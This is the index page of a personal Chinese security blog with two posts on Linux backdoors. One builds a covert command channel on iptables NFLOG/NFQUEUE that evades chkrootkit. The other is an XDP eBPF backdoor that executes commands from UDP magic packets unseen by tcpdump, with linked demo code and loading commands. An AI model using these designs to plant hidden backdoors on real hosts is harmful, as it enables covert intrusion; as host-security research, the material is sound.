<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"yoursite.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.8.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
<meta property="og:type" content="website">
<meta property="og:title" content="leveryd的个人博客">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="leveryd的个人博客">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="leveryd">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://yoursite.com/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>leveryd的个人博客</title>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">leveryd的个人博客</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">leveryd</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">58</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">23</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022-08-21-%E5%9F%BA%E4%BA%8Enetfilter%E7%9A%84%E5%90%8E%E9%97%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd的个人博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022-08-21-%E5%9F%BA%E4%BA%8Enetfilter%E7%9A%84%E5%90%8E%E9%97%A8/" class="post-title-link" itemprop="url">基于netfilter的后门</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-08-21 19:53:47" itemprop="dateCreated datePublished" datetime="2022-08-21T19:53:47+08:00">2022-08-21</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2022-08-30 14:47:13" itemprop="dateModified" datetime="2022-08-30T14:47:13+08:00">2022-08-30</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>蜜罐产品有个功能是对任何端口的访问都会被记录，即使是”nmap扫描后显示关闭”的端口访问也会被记录。它的实现原理是iptables的NFLOG。</p>
<p>学习NFLOG概念后，我想到也可以用它来做后门通信。</p>
<p>本文包括以下内容</p>
<ul>
<li>讨论NFLOG是什么</li>
<li>用NFLOG机制实现后门的优势分析</li>
<li>NFQUEUE后门demo</li>
</ul>
<p>希望能对主机安全感兴趣的读者有点帮助</p>
<h1 id="NFLOG是什么"><a href="#NFLOG是什么" class="headerlink" title="NFLOG是什么"></a>NFLOG是什么</h1><p>它是一个target，就像<code>ACCEPT</code>、<code>DROP</code>等可以作为<code>iptables -j</code>后的参数值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# iptables -A INPUT -p tcp -m multiport --dports 1:65535 -j NFLOG --nflog-group 2333</span><br></pre></td></tr></table></figure>

<p>比如上面规则就会告诉内核协议栈，在收到包时，目的端口是1到65535的包，全部执行NFLOG动作。</p>
<p><code>man iptables-extensions</code> 文档中也有关于NFLOG的说明</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">NFLOG</span><br><span class="line">    This  target  provides  logging of matching packets. When this target is set for a rule, the Linux kernel will pass the packet to the loaded logging backend to log the packet. This is usually</span><br><span class="line">    used in combination with nfnetlink_log as logging backend, which will multicast the packet through a netlink socket to the specified multicast group. One or more userspace processes may  sub-</span><br><span class="line">    scribe to the group to receive the packets. Like LOG, this is a non-terminating target, i.e. rule traversal continues at the next rule.</span><br><span class="line"></span><br><span class="line">    --nflog-group nlgroup</span><br><span class="line">           The netlink group (0 - 2^16-1) to which packets are (only applicable for nfnetlink_log). The default value is 0.</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p><code>-j NFLOG</code>和<code>-j LOG</code>有些类似，都可以记录数据包信息，执行动作后会继续匹配iptables规则中的下一条。区别是<code>-j NFLOG</code>可以让用户态程序通过<code>netlink</code>从内核获得数据包信息。</p>
<p>下面你可以和我一起做个小实验来验证一下,用户态程序是否可以通过<code>netlink</code>获取到数据包。</p>
<h1 id="用tcpdump验证"><a href="#用tcpdump验证" class="headerlink" title="用tcpdump验证"></a>用tcpdump验证</h1><p><img src="https://user-images.githubusercontent.com/1846319/185792120-a040054d-efd4-41a4-a1f5-5399df7ac8d6.png"></p>
<p>第一步，你需要配置iptables的nflog规则。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# iptables -A INPUT -p tcp -m multiport --dports 65530:65535 -j NFLOG --nflog-group 2333</span><br></pre></td></tr></table></figure>

<p>第二步，使用<code>tcpdump</code>订阅netlink消息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# tcpdump -i nflog:2333</span><br></pre></td></tr></table></figure>

<p>第三步，访问主机，验证<code>tcpdump</code>是否能获取到数据包。</p>
<p><code>curl x.x.x.x:65533</code> 后，可以抓到数据包。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# tcpdump -i nflog:2333</span><br><span class="line">...</span><br><span class="line">listening on nflog:2333, link-type NFLOG (Linux netfilter log messages), capture size 262144 bytes</span><br><span class="line">11:42:15.175375 IP 111.197.238.30.22293 &gt; instance-h9w7mlyv.65533: Flags [S], seq 3599662212, win 65535, options [mss 1452,nop,wscale 6,nop,nop,TS val 3053845653 ecr 0,sackOK,eol], length 0</span><br></pre></td></tr></table></figure>

<p>或许你会有一个问题：<code>tcpdump -i nflog:2333</code>和<code>tcpdump -i eth0</code>都可以获取数据包，有啥区别。</p>
<p>从编程实现来看是有区别的，<code>tcpdump -i eth0</code>是基于<code>AF_PACKET</code>获取数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# strace tcpdump -i lo</span><br><span class="line">socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL)) &#x3D; 3</span><br><span class="line">...</span><br><span class="line">setsockopt(3, SOL_PACKET, PACKET_RX_RING, 0x7ffeef157d10, 28) &#x3D; 0     &#x2F;&#x2F; Packet MMAP提高抓包性能，参考 https:&#x2F;&#x2F;github.com&#x2F;torvalds&#x2F;linux&#x2F;blob&#x2F;master&#x2F;Documentation&#x2F;networking&#x2F;packet_mmap.rst</span><br><span class="line">mmap(NULL, 4194304, PROT_READ|PROT_WRITE, MAP_SHARED, 3, 0) &#x3D; 0x7fedba9a5000</span><br><span class="line">...</span><br><span class="line">setsockopt(3, SOL_SOCKET, SO_ATTACH_FILTER, &#123;len&#x3D;1, filter&#x3D;0x7ff0a4ee8000&#125;, 16) &#x3D; 0   &#x2F;&#x2F; bpf filter</span><br><span class="line">setsockopt(3, SOL_SOCKET, SO_ATTACH_FILTER, &#123;len&#x3D;1, filter&#x3D;0x56436b7fe480&#125;, 16) &#x3D; 0</span><br><span class="line">...</span><br><span class="line">poll([&#123;fd&#x3D;3, events&#x3D;POLLIN&#125;], 1, 1000)  &#x3D; 0 (Timeout)</span><br><span class="line">poll([&#123;fd&#x3D;3, events&#x3D;POLLIN&#125;], 1, 1000)  &#x3D; 1 ([&#123;fd&#x3D;3, revents&#x3D;POLLIN&#125;])</span><br><span class="line">write(1, &quot;12:27:16.575888 IP localhost.416&quot;..., 16512:27:16.575888 IP localhost.41616 &gt; localhost.http: Flags [S], seq 3517707840, win 43690, options [mss 65495,sackOK,TS val 1304864277 ecr 0,nop,wscale 7], length 0</span><br></pre></td></tr></table></figure>

<p><code>tcpdump -i nflog:2333</code>是基于<code>AF_NETLINK</code>获取数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# strace tcpdump -i nflog:2333</span><br><span class="line">socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER) &#x3D; 3</span><br><span class="line">...</span><br><span class="line">recvfrom(3,[&#123;&#123;len&#x3D;184, type&#x3D;NFNL_SUBSYS_ULOG&lt;&lt;8|NFULNL_MSG_PACKET, flags&#x3D;0, seq&#x3D;0, pid&#x3D;0&#125;, &#123;nfgen_family&#x3D;AF_INET, version&#x3D;NFNETLINK_V0, res_id&#x3D;htons(2333), [&#123;&#123;nla_len&#x3D;8, nla_type&#x3D;NFNETLINK_V1&#125;, &quot;\x08\x00\x01\x00&quot;&#125;, &#123;&#123;nla_len&#x3D;5, nla_type&#x3D;0xa&#125;, &quot;\x00&quot;&#125;, &#123;&#123;nla_len&#x3D;8, nla_type&#x3D;0x4&#125;, &quot;\x00\x00\x00\x02&quot;&#125;, &#123;&#123;nla_len&#x3D;16, nla_type&#x3D;0x8&#125;, &quot;\x00\x06\x00\x00\xfa\x16\x3e\xd1\x8d\x2d\x00\x00&quot;&#125;, &#123;&#123;nla_len&#x3D;6, nla_type&#x3D;0xf&#125;, &quot;\x00\x01&quot;&#125;, &#123;&#123;nla_len&#x3D;6, nla_type&#x3D;0x11&#125;, &quot;\x00\x0e&quot;&#125;, &#123;&#123;nla_len&#x3D;18, nla_type&#x3D;0x10&#125;, &quot;\xfa\x28\x00\x0d\x3f\xff\xfa\x16\x3e\xd1\x8d\x2d\x08\x00&quot;&#125;, &#123;&#123;nla_len&#x3D;20, nla_type&#x3D;0x3&#125;, &quot;\x00\x00\x00\x00\x63\x08\x57\x83\x00\x00\x00\x00\x00\x03\x49\x03&quot;&#125;, &#123;&#123;nla_len&#x3D;68, nla_type&#x3D;0x9&#125;, &quot;\x45\x00\x00\x40\x00\x00\x40\x00\x32\x06\x1e\xc0\x6f\xc5\xee\x1e\xac\x10\x20\x04\x5b\x41\xff\xfd\x5a\x0c\x47\xf0\x00\x00\x00\x00&quot;...&#125;]&#125;, &#123;&#123;len&#x3D;184, type&#x3D;NFNL_SUBSYS_ULOG&lt;&lt;8|NFULNL_MSG_PACKET, flags&#x3D;0, seq&#x3D;0, pid&#x3D;0&#125;, &#123;nfgen_family&#x3D;AF_INET, version&#x3D;NFNETLINK_V0, res_id&#x3D;htons(2333), [&#123;&#123;nla_len&#x3D;8, nla_type&#x3D;NFNETLINK_V1&#125;, &quot;\x08\x00\x01\x00&quot;&#125;, &#123;&#123;nla_len&#x3D;5, nla_type&#x3D;0xa&#125;, &quot;\x00&quot;&#125;, &#123;&#123;nla_len&#x3D;8, nla_type&#x3D;0x4&#125;, &quot;\x00\x00\x00\x02&quot;&#125;, &#123;&#123;nla_len&#x3D;16, nla_type&#x3D;0x8&#125;, &quot;\x00\x06\x00\x00\xfa\x16\x3e\xd1\x8d\x2d\x00\x00&quot;&#125;, &#123;&#123;nla_len&#x3D;6, nla_type&#x3D;0xf&#125;, &quot;\x00\x01&quot;&#125;, &#123;&#123;nla_len&#x3D;6, nla_type&#x3D;0x11&#125;, &quot;\x00\x0e&quot;&#125;, &#123;&#123;nla_len&#x3D;18, nla_type&#x3D;0x10&#125;, &quot;\xfa\x28\x00\x0d\x3f\xff\xfa\x16\x3e\xd1\x8d\x2d\x08\x00&quot;&#125;, &#123;&#123;nla_len&#x3D;20, nla_type&#x3D;0x3&#125;, &quot;\x00\x00\x00\x00\x63\x08\x57\x84\x00\x00\x00\x00\x00\x03\x4b\x6c&quot;&#125;, &#123;&#123;nla_len&#x3D;68, nla_type&#x3D;0x9&#125;, &quot;\x45\x00\x00\x40\x00\x00\x40\x00\x32\x06\x1e\xc0\x6f\xc5\xee\x1e\xac\x10\x20\x04\x5b\x41\xff\xfd\x5a\x0c\x47\xf0\x00\x00\x00\x00&quot;...&#125;]&#125;, &#123;&#123;len&#x3D;20, type&#x3D;NLMSG_DONE, flags&#x3D;0, seq&#x3D;0, pid&#x3D;0&#125;, 0&#125;], 262272, 0, NULL, NULL) &#x3D; 388</span><br></pre></td></tr></table></figure>

<blockquote>
<p>不知道为什么实现监听流量时，厂家选择了基于<code>NFLOG</code>而不是<code>AF_PACKET</code>来做。</p>
</blockquote>
<p>而在实现后门中，我们也可以用<code>NFLOG</code>作为被控端和主控端的通信方式，下面来看一下它有什么好处。</p>
<h1 id="利用NFLOG做后门有什么好处"><a href="#利用NFLOG做后门有什么好处" class="headerlink" title="利用NFLOG做后门有什么好处"></a>利用<code>NFLOG</code>做后门有什么好处</h1><p>就像在 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Rezm05kP6fxB5Pwib1HxDA">聊一聊基于”ebpf xdp”的rootkit</a> 中我看到的: “rootkit用xdp ebpf和bpf技术都是为了通信时不监听端口，从而在网络行为上隐藏痕迹”。同样<code>NFLOG</code>也可以达到这个目的，甚至使用<code>NFLOG</code>相对于基于<code>AF_PACKET</code>的bpf后门从网络行为上看更隐蔽一点。为什么这么说呢？</p>
<p>举个例子，<code>chkrootkit</code>反入侵工具会通过<code>/proc/net/packet</code>检查哪些进程创建了<code>PF_PACKET</code>类型socket，因此可以发现bpf后门痕迹。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv tmp]# gcc ifpromisc.c</span><br><span class="line">[root@instance-h9w7mlyv tmp]# .&#x2F;a.out</span><br><span class="line">eth0: PF_PACKET(&#x2F;usr&#x2F;decoy&#x2F;decoysvc, &#x2F;usr&#x2F;sbin&#x2F;NetworkManager)</span><br><span class="line">docker0: PF_PACKET(&#x2F;usr&#x2F;sbin&#x2F;NetworkManager)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>AF_PACKET 和 PF_PACKET 同义</p>
</blockquote>
<p><code>chkrootkit</code>目前就不会检查<code>NFLOG</code>后门。虽然从<code>/proc/net/netlink</code>也可以看到哪些进程创建了<code>AF_NETLINK</code>类型socket，但是系统上正常进程也会创建很多<code>AF_NETLINK</code>类型socket，比如我在centos8虚机上看到有30多个记录。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv tmp]# cat &#x2F;proc&#x2F;net&#x2F;netlink | wc -l</span><br><span class="line">32</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/340">聊一聊chkrookit的误信和误用</a> 文章提到<code>chkrootkit</code>会扫描PF_PACKET</p>
</blockquote>
<p>利用<code>NFLOG</code>也应该比较稳定。为什么我这么认为呢？</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Il80jMO7YbsgctQZJtq7Mw">一种HTTP隧道内核态远控的实现方法</a> 文中提到一个思路: 在内核态基于netfilter实现一个可回显的后门。</p>
<p>而<code>NFLOG</code>有现成的lib库做用户态编程，相比于内核编程，我想用户态程序应该更稳定、适配性更好吧。</p>
<p>另外，iptables还提供了一个和<code>NFLOG</code>类似的扩展<code>NFQUEUE</code>，<code>man iptables-extensions</code>文档提到<code>NFQUEUE</code>可以修改数据包。所以是不是可以用<code>NFQUEUE</code>在用户态基于netfilter实现一个可回显的后门呢？</p>
<h1 id="NFQUEUE后门demo"><a href="#NFQUEUE后门demo" class="headerlink" title="NFQUEUE后门demo"></a>NFQUEUE后门demo</h1><p>我基于<code>libnetfilter_queue</code>写了一个后门demo</p>
<p>代码我放在了 <a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/f70bd0adbf8088446d98ec11ef16f478">https://gist.github.com/leveryd/f70bd0adbf8088446d98ec11ef16f478</a></p>
<p>运行效果如下</p>
<p><img src="https://user-images.githubusercontent.com/1846319/186878339-7d1982a5-23af-42a8-a137-31711061719c.png"></p>
<blockquote>
<p>因为我懒，所以这个后门没有实现回显。</p>
</blockquote>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>NFLOG在蜜罐、后门实现时都可以用到。</p>
<p>实现后门时，它的优点包括通信较为隐蔽、稳定、可回显。</p>
<!--
# 疑问
* netlink需要什么权限？
* 是否可以不用 sock_raw 实现抓包？

权限问题: 必须要有cap_net_admin权限，cap_net_raw权限都不管用.
-->

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022-08-14-%E8%81%8A%E4%B8%80%E8%81%8A%E5%9F%BA%E4%BA%8E%22ebpf%20xdp%22%E7%9A%84rootkit/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd的个人博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022-08-14-%E8%81%8A%E4%B8%80%E8%81%8A%E5%9F%BA%E4%BA%8E%22ebpf%20xdp%22%E7%9A%84rootkit/" class="post-title-link" itemprop="url">聊一聊基于"ebpf xdp"的rootkit</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-08-14 15:45:59" itemprop="dateCreated datePublished" datetime="2022-08-14T15:45:59+08:00">2022-08-14</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2022-08-19 21:37:59" itemprop="dateModified" datetime="2022-08-19T21:37:59+08:00">2022-08-19</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>在 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/7_ZrnKVaWuBjXCgmqdaUAQ">全流量入侵检测系统的性能分析</a> 中提到”包解析需要高性能”这个需求场景，和 pf_ring、dpdk 类似，xdp也是一种经常被讨论的高性能包处理技术。</p>
<p>在 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/EoiyhMIn6VpxWK92AZS_PQ">lkm和ebpf rootkit分析的简要记录</a> 中提到一个基于ebpf实现的rootkit <a target="_blank" rel="noopener" href="https://github.com/kris-nova/boopkit">boopkit</a>。这个后门通信部分当前是基于libpcap，还有一个未公开的xdp实现。</p>
<p>因此我感觉xdp在网络编程、网络安全上都能应用上，值得研究。于是我从实现”xdp ebpf后门”来学习xdp。</p>
<p>本文主要记录以下内容，希望对主机安全有兴趣的读者有点帮助。内容包括：</p>
<ul>
<li>xdp ebpf后门相比于 bpf 后门的优点</li>
<li>xdp后门demo</li>
<li>demo编写时的关键点</li>
<li>检测角度来看，xdp后门的特征</li>
</ul>
<p>关于ebpf和xdp的背景知识你可以参考 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/BOamc7V7lZQa1FTuJMqSIA">Linux网络新技术基石 |​eBPF and XDP</a></p>
<h1 id="xdp-ebpf后门和bpf后门对比"><a href="#xdp-ebpf后门和bpf后门对比" class="headerlink" title="xdp ebpf后门和bpf后门对比"></a>xdp ebpf后门和bpf后门对比</h1><p>已经有了bpf后门，为什么还有人要研究xdp ebpf后门呢？</p>
<p>在实现后门时，xdp ebpf和bpf技术都是为了获取数据包，可以做到不需要监听端口、客户端可以向服务端做单向通信。它俩的区别在于，xdp ebpf后门比bpf后门更加隐蔽，在主机上用tcpdump可以抓取bpf后门流量，但无法抓取xdp ebpf后门流量。</p>
<p>为什么会这样呢？</p>
<p><a target="_blank" rel="noopener" href="https://github.com/gwillgues/BPFDoor">bpfdoor</a> 、 <a target="_blank" rel="noopener" href="https://github.com/kris-nova/boopkit">boopkit</a> 等bpf后门都是基于af_packet抓包、bpf filter过滤包，它工作在链路层。</p>
<blockquote>
<p>关于bpfdoor的分析可以参考 <a target="_blank" rel="noopener" href="https://www.sandflysecurity.com/blog/bpfdoor-an-evasive-linux-backdoor-technical-analysis/">BPFDoor - An Evasive Linux Backdoor Technical Analysis</a></p>
</blockquote>
<p>xdp有三种工作模式，不论哪一种模式，在接收数据包时都比bpf后门要早。</p>
<p>tcpdump这种抓包工具的原理和bpf后门是一样的，也是工作在链路层。所以网卡接收到数据包后，会先经过xdp ebpf后门，然后分别经过bpf后门和tcpdump。</p>
<p>如果xdp ebpf后门在接收到恶意指令后把数据包丢掉，tcpdump就抓不到数据包。</p>
<h1 id="xdp后门demo"><a href="#xdp后门demo" class="headerlink" title="xdp后门demo"></a>xdp后门demo</h1><p>demo的源码我放到了github上：<a target="_blank" rel="noopener" href="https://github.com/leveryd/ebpf-app/tree/master/xdp_udp_backdoor">https://github.com/leveryd/ebpf-app/tree/master/xdp_udp_backdoor</a></p>
<p>最终实现了的后门demo效果如下, 控制端通过udp协议和被控端单向通信，被控端从通信流量中提取出payload后执行命令。</p>
<p><img src="https://user-images.githubusercontent.com/1846319/184612669-b393c611-0465-4a20-a7f1-09a70f5f8498.png" alt="image"></p>
<ul>
<li>通信数据格式是：| eth header | ip header | udp header | MAGIC_START command MAGIC_END |</li>
<li>被控端(xdp程序)提取udp数据后，通过<code>BPF_MAP_TYPE_ARRAY</code>类型的map将udp数据传给用户态程序</li>
<li>用户态程序执行<code>system(command)</code>执行系统命令后，清理map数据</li>
</ul>
<p>关于xdp编程的基本概念，我就不复述网络上已有的内容了。如果你和我一样是ebpf xdp新手，我推荐你看 <a target="_blank" rel="noopener" href="https://developers.redhat.com/blog/2021/04/01/get-started-with-xdp">Get started with XDP</a> 这篇入门文章。另外代码注释中的参考文章也不错。</p>
<p>在实现demo、加载xdp程序时，我遇到过两个报错。如果你也遇到，就可以参考我的解决办法。</p>
<p>第一个报错如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@08363214ec12:&#x2F;mnt# ip link set eth0 xdpgeneric obj xdp_udp_backdoor_bpf.o sec xdp_backdoor</span><br><span class="line"></span><br><span class="line">BTF debug data section &#39;.BTF&#39; rejected: Invalid argument (22)!</span><br><span class="line"> - Length:       741</span><br><span class="line">Verifier analysis:</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>这个报错的原因是某些ip命令不支持btf。如果你想要解决这个报错，有两种方式，一是centos系统上可以用xdp-loader工具替代ip命令加载xdp程序，二是基于libbpf库的bpf_set_link_xdp_fd接口编程实现加载xdp程序，就像demo中那样。</p>
<p>第二个报错如下，提示 BPF程序指令过多，超过1000000条的限制。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv xdp_backdoor]# make load</span><br><span class="line">[root@instance-h9w7mlyv xdp_backdoor]# make load</span><br><span class="line">clang -O2 -g -Wall -target bpf -c xdp_udp_backdoor.bpf.c -o xdp_udp_backdoor_bpf.o</span><br><span class="line">ip link set eth0 xdpgeneric off</span><br><span class="line">ip link set eth0 xdpgeneric obj xdp_udp_backdoor_bpf.o sec xdp_backdoor</span><br><span class="line">...</span><br><span class="line">BPF program is too large. Processed 1000001 insn</span><br><span class="line">processed 1000001 insns (limit 1000000) max_states_per_insn 18 total_states 18267 peak_states 4070 mark_read 5</span><br><span class="line"></span><br><span class="line">libbpf: -- END LOG --</span><br><span class="line">libbpf: failed to load program &#39;xdp_func&#39;</span><br><span class="line">libbpf: failed to load object &#39;xdp_udp_backdoor_bpf.o&#39;</span><br></pre></td></tr></table></figure>

<p>这个报错的原因是在加载ebpf程序时，会经过内核中<a target="_blank" rel="noopener" href="https://ebpf.io/what-is-ebpf/#verification">ebpf Verification</a>的校验，其中它会检查是否有ebpf程序是否可能出现死循环。</p>
